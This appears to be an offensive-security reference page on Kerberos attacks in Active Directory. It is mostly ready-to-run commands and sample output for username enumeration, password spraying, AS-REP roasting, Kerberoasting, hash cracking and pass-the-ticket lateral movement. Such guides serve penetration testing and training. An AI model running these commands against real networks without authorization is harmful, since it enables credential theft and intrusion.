% Filename: 02-reconnaissance/enum-windows/kerberos.md
% Display name: Kerberos Enumeration
% Last update: 2026-02-11
% ATT&CK Tactics: TA0043 (Reconnaissance), TA0006 (Credential Access)
% ATT&CK Techniques: T1595 (Active Scanning), T1558.003 (Kerberoasting), T1558.004 (AS-REP Roasting)
% Authors: @TristanInSec

# Kerberos Enumeration

## Overview

Kerberos runs on TCP/UDP 88 and is the default authentication protocol in Active Directory environments. Enumeration targets user validation (without triggering lockouts), service account discovery via SPNs, and identification of accounts vulnerable to offline password cracking through AS-REP Roasting and Kerberoasting. Kerberos enumeration is stealthier than SMB or LDAP brute-forcing because failed authentication attempts are logged differently.

## ATT&CK Mapping

- **Tactics:** TA0043 - Reconnaissance, TA0006 - Credential Access
- **Technique:** T1595 - Active Scanning
- **Technique:** T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
- **Technique:** T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting

## Prerequisites

- Network access to target TCP 88
- Domain name known (from LDAP, SMB, or DNS enumeration)
- `kerbrute`, `impacket`, or Nmap installed

**Important:** Kerberos requires DNS resolution of the domain name. Ensure `/etc/hosts` maps the DC IP to the domain, or configure DNS to point to the DC:

```bash
# Add to /etc/hosts
echo '<DC_IP> corp.local dc01.corp.local' >> /etc/hosts

# Or set DNS
echo 'nameserver <DC_IP>' > /etc/resolv.conf
```

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 88 <target>
```

The presence of TCP 88 confirms a Kerberos KDC, which almost always means a domain controller.

### User Enumeration with kerbrute

kerbrute validates usernames against Kerberos without triggering traditional logon failure events (no event ID 4625). It sends AS-REQ messages and checks the response — valid users get a different error than invalid ones.

```bash
# kerbrute
# https://github.com/ropnop/kerbrute
# Enumerate valid usernames from a wordlist
kerbrute userenum -d <domain> --dc <DC_IP> usernames.txt

# Enumerate with specific format
kerbrute userenum -d corp.local --dc 10.10.10.1 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Expected output:
```text
2024/01/15 10:30:01 >  [+] VALID USERNAME:  administrator@corp.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:  j.smith@corp.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:  svc_sql@corp.local
```

kerbrute is not on Kali by default. Install from source:

```bash
# Install kerbrute from source
# https://github.com/ropnop/kerbrute
# Requires Go: sudo apt install golang-go
go install github.com/ropnop/kerbrute@latest

# Binary will be in ~/go/bin/kerbrute
export PATH=$PATH:~/go/bin
```

### Password Spraying with kerbrute

```bash
# kerbrute
# https://github.com/ropnop/kerbrute
# Test one password against many users
kerbrute passwordspray -d <domain> --dc <DC_IP> valid_users.txt 'Password123!'

# Brute-force specific user
kerbrute bruteuser -d <domain> --dc <DC_IP> passwords.txt j.smith
```

Password spraying via Kerberos avoids SMB lockout monitoring in some environments. However, accounts will still lock if the domain policy threshold is exceeded. Kerberos pre-authentication failures still generate event IDs 4771 (Kerberos pre-auth failed) and 4768 (TGT requests), so this is not stealthy against SIEM monitoring.

### AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" enabled return an AS-REP containing an encrypted portion crackable offline. No credentials are needed to request this — only a valid username:

```bash
# Impacket GetNPUsers
# https://github.com/fortra/impacket
# Without credentials (requires a user list)
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> \
  -no-pass -format hashcat -outputfile asrep_hashes.txt

# With credentials (auto-discovers vulnerable accounts via LDAP)
impacket-GetNPUsers '<domain>/<user>:<password>' -dc-ip <DC_IP> \
  -request -format hashcat -outputfile asrep_hashes.txt
```

Key flags:
- `-request` — retrieve the crackable hash (without it, only lists vulnerable accounts without requesting the TGT)
- `-format hashcat` — output format (`hashcat` or `john`, default is `hashcat`)
- `-outputfile` — save hashes to file
- `-usersfile` — supply usernames when no credentials available
- `-no-pass` — don't prompt for password

Expected output:
```text
$krb5asrep$23$svc_backup@CORP.LOCAL:abc123...truncated...
```

Crack with Hashcat:

```bash
# Hashcat
# https://hashcat.net/hashcat/
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
# NetExec
# https://github.com/Pennyw0rth/NetExec
# AS-REP Roast with credentials
nxc ldap <DC_IP> -u <user> -p <password> -d <domain> --asreproast asrep_hashes.txt
```

### Kerberoasting

Service accounts with SPNs (Service Principal Names) return TGS tickets containing an encrypted portion tied to the service account's password. Any authenticated domain user can request these:

```bash
# Impacket GetUserSPNs
# https://github.com/fortra/impacket
# Request TGS tickets for all service accounts
impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <DC_IP> \
  -request -outputfile kerberoast_hashes.txt

# Just list SPNs without requesting tickets (omit -request)
impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <DC_IP>

# With NTLM hash (pass-the-hash)
impacket-GetUserSPNs '<domain>/<user>' -dc-ip <DC_IP> \
  -hashes ':NThash' -request -outputfile kerberoast_hashes.txt
```

Key flags:
- `-request` — retrieve the crackable TGS (without it, only lists SPNs without requesting the ticket)
- `-outputfile` — save hashes to file
- `-hashes` — pass-the-hash format `[LMhash]:NThash` (LM hash optional, colon required)
- `-dc-ip` — domain controller IP

Expected output:
```text
ServicePrincipalName  Name      MemberOf                     PasswordLastSet
--------------------  --------  ---------------------------  -------------------
MSSQLSvc/db01:1433    svc_sql   CN=Domain Admins,CN=Users    2023-06-15 14:30:00
HTTP/web01.corp.local svc_web                                2022-11-20 09:15:00
```

Crack with Hashcat:

```bash
# Hashcat
# https://hashcat.net/hashcat/
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
# NetExec
# https://github.com/Pennyw0rth/NetExec
# Kerberoast with credentials
nxc ldap <DC_IP> -u <user> -p <password> -d <domain> --kerberoasting kerberoast_hashes.txt
```

### Nmap NSE Scripts

```bash
# Nmap
# https://nmap.org/
# Enumerate Kerberos encryption types
nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='<domain>',userdb=users.txt" <target>
```

### Ticket Extraction (Post-Authentication)

Once authenticated on a domain-joined machine, extract cached tickets:

```bash
# Impacket getTGT
# https://github.com/fortra/impacket
# Request a TGT with known credentials
impacket-getTGT '<domain>/<user>:<password>' -dc-ip <DC_IP>

# Request a TGT with NTLM hash
impacket-getTGT '<domain>/<user>' -dc-ip <DC_IP> -hashes ':NThash'

# Use the ticket for lateral movement
export KRB5CCNAME=<user>.ccache
impacket-smbclient -k -no-pass <target>
impacket-psexec -k -no-pass '<domain>/<user>@<target>'
impacket-wmiexec -k -no-pass '<domain>/<user>@<target>'
```

## Post-Enumeration

With Kerberos data collected, prioritize:
- Validated usernames for targeted password spraying
- AS-REP hashes for offline cracking (accounts without pre-auth)
- Kerberoast hashes for offline cracking (service accounts with SPNs)
- Cracked service account passwords — often have elevated privileges (Domain Admins, SQL access)
- Ticket reuse for lateral movement (pass-the-ticket)
- SPN mapping reveals internal services and their hosting servers

## References

### Nmap NSE Scripts

- [krb5-enum-users](https://nmap.org/nsedoc/scripts/krb5-enum-users.html)

### Tools

- [kerbrute](https://github.com/ropnop/kerbrute)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)

### Official Documentation

- [RFC 4120 - The Kerberos Network Authentication Service (V5)](https://datatracker.ietf.org/doc/html/rfc4120)

### MITRE ATT&CK

- [T1595 - Active Scanning](https://attack.mitre.org/techniques/T1595/)
- [T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
